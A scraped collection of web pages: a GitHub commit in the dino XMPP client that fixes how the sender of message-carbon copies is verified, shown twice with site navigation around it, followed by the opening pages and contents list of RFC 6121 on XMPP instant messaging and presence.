|  |  | return true; |
|  |  | } |
|  |  | if (received\_node != null) { |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `e84f2c4`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdino%2Fdino%2Fcommit%2Fe84f2c49567e86d2a261ea264d65c4adc549c930) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_44e79fc6_20250121_025934.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdino%2Fdino%2Fcommit%2Fe84f2c49567e86d2a261ea264d65c4adc549c930)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdino%2Fdino%2Fcommit%2Fe84f2c49567e86d2a261ea264d65c4adc549c930)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=dino%2Fdino)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[dino](/dino)
/
**[dino](/dino/dino)**
Public

* [Notifications](/login?return_to=%2Fdino%2Fdino) You must be signed in to change notification settings
* [Fork
  249](/login?return_to=%2Fdino%2Fdino)
* [Star
   2.2k](/login?return_to=%2Fdino%2Fdino)

* [Code](/dino/dino)
* [Issues
  528](/dino/dino/issues)
* [Pull requests
  33](/dino/dino/pulls)
* [Actions](/dino/dino/actions)
* [Projects
  0](/dino/dino/projects)
* [Wiki](/dino/dino/wiki)
* [Security](/dino/dino/security)
* [Insights](/dino/dino/pulse)

Additional navigation options

* [Code](/dino/dino)
* [Issues](/dino/dino/issues)
* [Pull requests](/dino/dino/pulls)
* [Actions](/dino/dino/actions)
* [Projects](/dino/dino/projects)
* [Wiki](/dino/dino/wiki)
* [Security](/dino/dino/security)
* [Insights](/dino/dino/pulse)

## Commit

[Permalink](/dino/dino/commit/e84f2c49567e86d2a261ea264d65c4adc549c930)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fix check of source of a carbons message

[Browse files](/dino/dino/tree/e84f2c49567e86d2a261ea264d65c4adc549c930)
Browse the repository at this point in the history

* Loading branch information

[![@mar-v-in](https://avatars.githubusercontent.com/u/994036?s=40&v=4)](/mar-v-in)

[mar-v-in](/dino/dino/commits?author=mar-v-in "View all commits by mar-v-in")
committed
Sep 10, 2019

1 parent
[bd7fde9](/dino/dino/commit/bd7fde99af3df59c5ec96184b2649b4308250b24)

commit e84f2c4

Showing
**1 changed file**
with
**2 additions**
and
**2 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

4 changes: 2 additions & 2 deletions

4
[xmpp-vala/src/module/xep/0280\_message\_carbons.vala](#diff-acfb817f08aac774de8a6f8296cd4a9471d4c30c32630b45ac4233b5fe899153 "xmpp-vala/src/module/xep/0280_message_carbons.vala")

Show comments

[View file](/dino/dino/blob/e84f2c49567e86d2a261ea264d65c4adc549c930/xmpp-vala/src/module/xep/0280_message_carbons.vala)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -52,9 +52,9 @@ public class ReceivedPipelineListener : StanzaListener<MessageStanza> { |
|  |  | StanzaNode? forwarded\_node = carbons\_node.get\_subnode("forwarded", "urn:xmpp:forward:0"); |
|  |  | if (forwarded\_node != null) { |
|  |  | StanzaNode? message\_node = forwarded\_node.get\_subnode("message", Xmpp.NS\_URI); |
|  |  | string? from\_attribute = message\_node.get\_attribute("from", Xmpp.NS\_URI); |
|  |  | // Any forwarded copies received by a Carbons-enabled client MUST be from that user's bare JID; any copies that do not meet this requirement MUST be ignored. |
|  |  | if (from\_attribute != null && from\_attribute == stream.get\_flag(Bind.Flag.IDENTITY).my\_jid.bare\_jid.to\_string()) { |
|  |  | if (!message.from.equals(stream.get\_flag(Bind.Flag.IDENTITY).my\_jid.bare\_jid)) { |
|  |  | warning("Received alleged carbon message from %s, ignoring", message.from.to\_string()); |
|  |  | return true; |
|  |  | } |
|  |  | if (received\_node != null) { |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `e84f2c4`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdino%2Fdino%2Fcommit%2Fe84f2c49567e86d2a261ea264d65c4adc549c930) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_44e79fc6_20250121_025947.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdino%2Fdino%2Fcommit%2Fe84f2c49567e86d2a261ea264d65c4adc549c930)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdino%2Fdino%2Fcommit%2Fe84f2c49567e86d2a261ea264d65c4adc549c930)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fcommit%2Fshow&source=header-repo&source_repo=dino%2Fdino)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[dino](/dino)
/
**[dino](/dino/dino)**
Public

* [Notifications](/login?return_to=%2Fdino%2Fdino) You must be signed in to change notification settings
* [Fork
  249](/login?return_to=%2Fdino%2Fdino)
* [Star
   2.2k](/login?return_to=%2Fdino%2Fdino)

* [Code](/dino/dino)
* [Issues
  528](/dino/dino/issues)
* [Pull requests
  33](/dino/dino/pulls)
* [Actions](/dino/dino/actions)
* [Projects
  0](/dino/dino/projects)
* [Wiki](/dino/dino/wiki)
* [Security](/dino/dino/security)
* [Insights](/dino/dino/pulse)

Additional navigation options

* [Code](/dino/dino)
* [Issues](/dino/dino/issues)
* [Pull requests](/dino/dino/pulls)
* [Actions](/dino/dino/actions)
* [Projects](/dino/dino/projects)
* [Wiki](/dino/dino/wiki)
* [Security](/dino/dino/security)
* [Insights](/dino/dino/pulse)

## Commit

[Permalink](/dino/dino/commit/e84f2c49567e86d2a261ea264d65c4adc549c930)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fix check of source of a carbons message

[Browse files](/dino/dino/tree/e84f2c49567e86d2a261ea264d65c4adc549c930)
Browse the repository at this point in the history

* Loading branch information

[![@mar-v-in](https://avatars.githubusercontent.com/u/994036?s=40&v=4)](/mar-v-in)

[mar-v-in](/dino/dino/commits?author=mar-v-in "View all commits by mar-v-in")
committed
Sep 10, 2019

1 parent
[bd7fde9](/dino/dino/commit/bd7fde99af3df59c5ec96184b2649b4308250b24)

commit e84f2c4

Showing
**1 changed file**
with
**2 additions**
and
**2 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

4 changes: 2 additions & 2 deletions

4
[xmpp-vala/src/module/xep/0280\_message\_carbons.vala](#diff-acfb817f08aac774de8a6f8296cd4a9471d4c30c32630b45ac4233b5fe899153 "xmpp-vala/src/module/xep/0280_message_carbons.vala")

Show comments

[View file](/dino/dino/blob/e84f2c49567e86d2a261ea264d65c4adc549c930/xmpp-vala/src/module/xep/0280_message_carbons.vala)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -52,9 +52,9 @@ public class ReceivedPipelineListener : StanzaListener<MessageStanza> { |
|  |  | StanzaNode? forwarded\_node = carbons\_node.get\_subnode("forwarded", "urn:xmpp:forward:0"); |
|  |  | if (forwarded\_node != null) { |
|  |  | StanzaNode? message\_node = forwarded\_node.get\_subnode("message", Xmpp.NS\_URI); |
|  |  | string? from\_attribute = message\_node.get\_attribute("from", Xmpp.NS\_URI); |
|  |  | // Any forwarded copies received by a Carbons-enabled client MUST be from that user's bare JID; any copies that do not meet this requirement MUST be ignored. |
|  |  | if (from\_attribute != null && from\_attribute == stream.get\_flag(Bind.Flag.IDENTITY).my\_jid.bare\_jid.to\_string()) { |
|  |  | if (!message.from.equals(stream.get\_flag(Bind.Flag.IDENTITY).my\_jid.bare\_jid)) { |
|  |  | warning("Received alleged carbon message from %s, ignoring", message.from.to\_string()); |
|  |  | return true; |
|  |  | } |
|  |  | if (received\_node != null) { |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `e84f2c4`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdino%2Fdino%2Fcommit%2Fe84f2c49567e86d2a261ea264d65c4adc549c930) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from tools.ietf.org_2f6b2a7f_20250121_025949.html ===


* Light
* Dark
* Auto

[RFC 6121

Proposed Standard](/doc/rfc6121/)

|  | Title |  | Extensible Messaging and Presence Protocol (XMPP): Instant Messaging and Presence |
| --- | --- | --- | --- |
| Document | Document type |  | RFC - Proposed Standard  March 2011  [View errata](https://www.rfc-editor.org/errata_search.php?rfc=6121 "Click to view errata.") [Report errata](https://www.rfc-editor.org/errata.php#reportnew "Click to report an error in the document.") Obsoletes [RFC 3921](/doc/html/rfc3921 "Extensible Messaging and Presence Protocol (XMPP): Instant Messaging and Presence") Was [draft-ietf-xmpp-3921bis](/doc/draft-ietf-xmpp-3921bis/20/) ([xmpp WG](/wg/xmpp/about/)) |
| --- | --- | --- | --- |
|  | Select version |  | * [20](/doc/html/draft-ietf-xmpp-3921bis-20) * [RFC 6121](/doc/html/rfc6121) |
|  | Compare versions |  | RFC 6121  draft-ietf-xmpp-3921bis-20  draft-ietf-xmpp-3921bis-19  draft-ietf-xmpp-3921bis-18  draft-ietf-xmpp-3921bis-17  draft-ietf-xmpp-3921bis-16  draft-ietf-xmpp-3921bis-15  draft-ietf-xmpp-3921bis-14  draft-ietf-xmpp-3921bis-13  draft-ietf-xmpp-3921bis-12  draft-ietf-xmpp-3921bis-11  draft-ietf-xmpp-3921bis-10  draft-ietf-xmpp-3921bis-09  draft-ietf-xmpp-3921bis-08  draft-ietf-xmpp-3921bis-07  draft-ietf-xmpp-3921bis-06  draft-ietf-xmpp-3921bis-05  draft-ietf-xmpp-3921bis-04  draft-ietf-xmpp-3921bis-03  draft-ietf-xmpp-3921bis-02  draft-ietf-xmpp-3921bis-01  draft-ietf-xmpp-3921bis-00   RFC 6121  draft-ietf-xmpp-3921bis-20  draft-ietf-xmpp-3921bis-19  draft-ietf-xmpp-3921bis-18  draft-ietf-xmpp-3921bis-17  draft-ietf-xmpp-3921bis-16  draft-ietf-xmpp-3921bis-15  draft-ietf-xmpp-3921bis-14  draft-ietf-xmpp-3921bis-13  draft-ietf-xmpp-3921bis-12  draft-ietf-xmpp-3921bis-11  draft-ietf-xmpp-3921bis-10  draft-ietf-xmpp-3921bis-09  draft-ietf-xmpp-3921bis-08  draft-ietf-xmpp-3921bis-07  draft-ietf-xmpp-3921bis-06  draft-ietf-xmpp-3921bis-05  draft-ietf-xmpp-3921bis-04  draft-ietf-xmpp-3921bis-03  draft-ietf-xmpp-3921bis-02  draft-ietf-xmpp-3921bis-01  draft-ietf-xmpp-3921bis-00   Side-by-side  Inline |
|  | Author |  | [Peter Saint-Andre](/person/stpeter%40stpeter.im "Datatracker profile of Peter Saint-Andre")   Email authors |
|  | RFC stream |  | IETF Logo IETF Logo |
|  | Other formats |  | [txt](https://www.rfc-editor.org/rfc/rfc6121.txt) [html](https://www.rfc-editor.org/rfc/rfc6121.html) [pdf](https://www.rfc-editor.org/rfc/pdfrfc/rfc6121.txt.pdf) [bibtex](/doc/rfc6121/bibtex/) |
|  | Additional resources |  | [Mailing list discussion](https://mailarchive.ietf.org/arch/browse/xmpp/?q=rfc6121 OR %22draft-ietf-xmpp-3921bis%22) |
|  |  |  | [Report a bug](https://github.com/ietf-tools/datatracker/issues/new/choose) |

```
Internet Engineering Task Force (IETF)                    P. Saint-Andre
Request for Comments: 6121                                         Cisco
Obsoletes: [3921](/doc/html/rfc3921)                                               March 2011
Category: Standards Track
ISSN: 2070-1721

           Extensible Messaging and Presence Protocol (XMPP):
                     Instant Messaging and Presence

Abstract

   This document defines extensions to core features of the Extensible
   Messaging and Presence Protocol (XMPP) that provide basic instant
   messaging (IM) and presence functionality in conformance with the
   requirements in [RFC 2779](/doc/html/rfc2779).  This document obsoletes [RFC 3921](/doc/html/rfc3921).

Status of this Memo

   This is an Internet Standards Track document.

   This document is a product of the Internet Engineering Task Force
   (IETF).  It represents the consensus of the IETF community.  It has
   received public review and has been approved for publication by the
   Internet Engineering Steering Group (IESG).  Further information on
   Internet Standards is available in [Section 2 of RFC 5741](/doc/html/rfc5741#section-2).

   Information about the current status of this document, any errata,
   and how to provide feedback on it may be obtained at
   <http://www.rfc-editor.org/info/rfc6121>.

Copyright Notice

   Copyright (c) 2011 IETF Trust and the persons identified as the
   document authors.  All rights reserved.

   This document is subject to [BCP 78](/doc/html/bcp78) and the IETF Trust's Legal
   Provisions Relating to IETF Documents
   (<http://trustee.ietf.org/license-info>) in effect on the date of
   publication of this document.  Please review these documents
   carefully, as they describe your rights and restrictions with respect
   to this document.  Code Components extracted from this document must
   include Simplified BSD License text as described in Section 4.e of
   the Trust Legal Provisions and are provided without warranty as
   described in the Simplified BSD License.

Saint-Andre                  Standards Track                    [Page 1]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

Table of Contents

   [1](#section-1).  Introduction  . . . . . . . . . . . . . . . . . . . . . . . .   [5](#page-5)
     [1.1](#section-1.1).  Overview  . . . . . . . . . . . . . . . . . . . . . . . .   [5](#page-5)
     [1.2](#section-1.2).  History . . . . . . . . . . . . . . . . . . . . . . . . .   [5](#page-5)
     [1.3](#section-1.3).  Requirements  . . . . . . . . . . . . . . . . . . . . . .   [5](#page-5)
     [1.4](#section-1.4).  Functional Summary  . . . . . . . . . . . . . . . . . . .   [7](#page-7)
     [1.5](#section-1.5).  Terminology . . . . . . . . . . . . . . . . . . . . . . .   [8](#page-8)
   [2](#section-2).  Managing the Roster . . . . . . . . . . . . . . . . . . . . .   [9](#page-9)
     [2.1](#section-2.1).  Syntax and Semantics  . . . . . . . . . . . . . . . . . .   [9](#page-9)
       [2.1.1](#section-2.1.1).  Ver Attribute . . . . . . . . . . . . . . . . . . . .  [10](#page-10)
       [2.1.2](#section-2.1.2).  Roster Items  . . . . . . . . . . . . . . . . . . . .  [10](#page-10)
         [2.1.2.1](#section-2.1.2.1).  Approved Attribute  . . . . . . . . . . . . . . .  [10](#page-10)
         [2.1.2.2](#section-2.1.2.2).  Ask Attribute . . . . . . . . . . . . . . . . . .  [10](#page-10)
         [2.1.2.3](#section-2.1.2.3).  JID Attribute . . . . . . . . . . . . . . . . . .  [11](#page-11)
         [2.1.2.4](#section-2.1.2.4).  Name Attribute  . . . . . . . . . . . . . . . . .  [11](#page-11)
         [2.1.2.5](#section-2.1.2.5).  Subscription Attribute  . . . . . . . . . . . . .  [11](#page-11)
         [2.1.2.6](#section-2.1.2.6).  Group Element . . . . . . . . . . . . . . . . . .  [12](#page-12)
       [2.1.3](#section-2.1.3).  Roster Get  . . . . . . . . . . . . . . . . . . . . .  [12](#page-12)
       [2.1.4](#section-2.1.4).  Roster Result . . . . . . . . . . . . . . . . . . . .  [13](#page-13)
       [2.1.5](#section-2.1.5).  Roster Set  . . . . . . . . . . . . . . . . . . . . .  [14](#page-14)
       [2.1.6](#section-2.1.6).  Roster Push . . . . . . . . . . . . . . . . . . . . .  [14](#page-14)
     [2.2](#section-2.2).  Retrieving the Roster on Login  . . . . . . . . . . . . .  [16](#page-16)
     [2.3](#section-2.3).  Adding a Roster Item  . . . . . . . . . . . . . . . . . .  [17](#page-17)
       [2.3.1](#section-2.3.1).  Request . . . . . . . . . . . . . . . . . . . . . . .  [17](#page-17)
       [2.3.2](#section-2.3.2).  Success Case  . . . . . . . . . . . . . . . . . . . .  [17](#page-17)
       [2.3.3](#section-2.3.3).  Error Cases . . . . . . . . . . . . . . . . . . . . .  [18](#page-18)
     [2.4](#section-2.4).  Updating a Roster Item  . . . . . . . . . . . . . . . . .  [22](#page-22)
       [2.4.1](#section-2.4.1).  Request . . . . . . . . . . . . . . . . . . . . . . .  [22](#page-22)
       [2.4.2](#section-2.4.2).  Success Case  . . . . . . . . . . . . . . . . . . . .  [24](#page-24)
       [2.4.3](#section-2.4.3).  Error Cases . . . . . . . . . . . . . . . . . . . . .  [24](#page-24)
     [2.5](#section-2.5).  Deleting a Roster Item  . . . . . . . . . . . . . . . . .  [24](#page-24)
       [2.5.1](#section-2.5.1).  Request . . . . . . . . . . . . . . . . . . . . . . .  [24](#page-24)
       [2.5.2](#section-2.5.2).  Success Case  . . . . . . . . . . . . . . . . . . . .  [25](#page-25)
       [2.5.3](#section-2.5.3).  Error Cases . . . . . . . . . . . . . . . . . . . . .  [26](#page-26)
     [2.6](#section-2.6).  Roster Versioning . . . . . . . . . . . . . . . . . . . .  [26](#page-26)
       [2.6.1](#section-2.6.1).  Stream Feature  . . . . . . . . . . . . . . . . . . .  [26](#page-26)
       [2.6.2](#section-2.6.2).  Request . . . . . . . . . . . . . . . . . . . . . . .  [26](#page-26)
       [2.6.3](#section-2.6.3).  Success Case  . . . . . . . . . . . . . . . . . . . .  [27](#page-27)
   [3](#section-3).  Managing Presence Subscriptions . . . . . . . . . . . . . . .  [30](#page-30)
     [3.1](#section-3.1).  Requesting a Subscription . . . . . . . . . . . . . . . .  [30](#page-30)
       3.1.1.  Client Generation of Outbound Subscription Request  .  31
       3.1.2.  Server Processing of Outbound Subscription Request  .  32
       [3.1.3](#section-3.1.3).  Server Processing of Inbound Subscription Request . .  [34](#page-34)
       [3.1.4](#section-3.1.4).  Client Processing of Inbound Subscription Request . .  [35](#page-35)
       3.1.5.  Server Processing of Outbound Subscription Approval .  36
       3.1.6.  Server Processing of Inbound Subscription Approval  .  38

Saint-Andre                  Standards Track                    [Page 2]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

     [3.2](#section-3.2).  Canceling a Subscription  . . . . . . . . . . . . . . . .  [40](#page-40)
       [3.2.1](#section-3.2.1).  Client Generation of Subscription Cancellation  . . .  [40](#page-40)
       3.2.2.  Server Processing of Outbound Subscription
               Cancellation  . . . . . . . . . . . . . . . . . . . .  [40](#page-40)
       3.2.3.  Server Processing of Inbound Subscription
               Cancellation  . . . . . . . . . . . . . . . . . . . .  [41](#page-41)
     [3.3](#section-3.3).  Unsubscribing . . . . . . . . . . . . . . . . . . . . . .  [43](#page-43)
       [3.3.1](#section-3.3.1).  Client Generation of Unsubscribe  . . . . . . . . . .  [43](#page-43)
       [3.3.2](#section-3.3.2).  Server Processing of Outbound Unsubscribe . . . . . .  [43](#page-43)
       [3.3.3](#section-3.3.3).  Server Processing of Inbound Unsubscribe  . . . . . .  [44](#page-44)
     [3.4](#section-3.4).  Pre-Approving a Subscription Request  . . . . . . . . . .  [46](#page-46)
       [3.4.1](#section-3.4.1).  Client Generation of Subscription Pre-Approval  . . .  [46](#page-46)
       [3.4.2](#section-3.4.2).  Server Processing of Subscription Pre-Approval  . . .  [47](#page-47)
   [4](#section-4).  Exchanging Presence Information . . . . . . . . . . . . . . .  [48](#page-48)
     [4.1](#section-4.1).  Presence Fundamentals . . . . . . . . . . . . . . . . . .  [48](#page-48)
     [4.2](#section-4.2).  Initial Presence  . . . . . . . . . . . . . . . . . . . .  [49](#page-49)
       [4.2.1](#section-4.2.1).  Client Generation of Initial Presence . . . . . . . .  [49](#page-49)
       [4.2.2](#section-4.2.2).  Server Processing of Outbound Initial Presence  . . .  [50](#page-50)
       [4.2.3](#section-4.2.3).  Server Processing of Inbound Initial Presence . . . .  [50](#page-50)
       [4.2.4](#section-4.2.4).  Client Processing of Initial Presence . . . . . . . .  [51](#page-51)
     [4.3](#section-4.3).  Presence Probes . . . . . . . . . . . . . . . . . . . . .  [51](#page-51)
       [4.3.1](#section-4.3.1).  Server Generation of Outbound Presence Probe  . . . .  [52](#page-52)
       [4.3.2](#section-4.3.2).  Server Processing of Inbound Presence Probe . . . . .  [53](#page-53)
         [4.3.2.1](#section-4.3.2.1).  Handling of the 'id' Attribute  . . . . . . . . .  [55](#page-55)
     [4.4](#section-4.4).  Subsequent Presence Broadcast . . . . . . . . . . . . . .  [57](#page-57)
       4.4.1.  Client Generation of Subsequent Presence Broadcast  .  57
       [4.4.2](#section-4.4.2).  Server Processing of Subsequent Outbound Presence . .  [57](#page-57)
       [4.4.3](#section-4.4.3).  Server Processing of Subsequent Inbound Presence  . .  [58](#page-58)
       [4.4.4](#section-4.4.4).  Client Processing of Subsequent Presence  . . . . . .  [59](#page-59)
     [4.5](#section-4.5).  Unavailable Presence  . . . . . . . . . . . . . . . . . .  [59](#page-59)
       [4.5.1](#section-4.5.1).  Client Generation of Unavailable Presence . . . . . .  [59](#page-59)
       4.5.2.  Server Processing of Outbound Unavailable Presence  .  59
       [4.5.3](#section-4.5.3).  Server Processing of Inbound Unavailable Presence . .  [61](#page-61)
       [4.5.4](#section-4.5.4).  Client Processing of Unavailable Presence . . . . . .  [62](#page-62)
     [4.6](#section-4.6).  Directed Presence . . . . . . . . . . . . . . . . . . . .  [62](#page-62)
       [4.6.1](#section-4.6.1).  General Considerations  . . . . . . . . . . . . . . .  [62](#page-62)
       [4.6.2](#section-4.6.2).  Client Generation of Directed Presence  . . . . . . .  [63](#page-63)
       [4.6.3](#section-4.6.3).  Server Processing of Outbound Directed Presence . . .  [63](#page-63)
       [4.6.4](#section-4.6.4).  Server Processing of Inbound Directed Presence  . . .  [64](#page-64)
       [4.6.5](#section-4.6.5).  Client Processing of Inbound Directed Presence  . . .  [64](#page-64)
       [4.6.6](#section-4.6.6).  Server Processing of Presence Probes  . . . . . . . .  [64](#page-64)
     [4.7](#section-4.7).  Presence Syntax . . . . . . . . . . . . . . . . . . . . .  [65](#page-65)
       [4.7.1](#section-4.7.1).  Type Attribute  . . . . . . . . . . . . . . . . . . .  [65](#page-65)
       [4.7.2](#section-4.7.2).  Child Elements  . . . . . . . . . . . . . . . . . . .  [66](#page-66)
         [4.7.2.1](#section-4.7.2.1).  Show Element  . . . . . . . . . . . . . . . . . .  [66](#page-66)
         [4.7.2.2](#section-4.7.2.2).  Status Element  . . . . . . . . . . . . . . . . .  [67](#page-67)
         [4.7.2.3](#section-4.7.2.3).  Priority Element  . . . . . . . . . . . . . . . .  [68](#page-68)
       [4.7.3](#section-4.7.3).  Extended Content  . . . . . . . . . . . . . . . . . .  [69](#page-69)

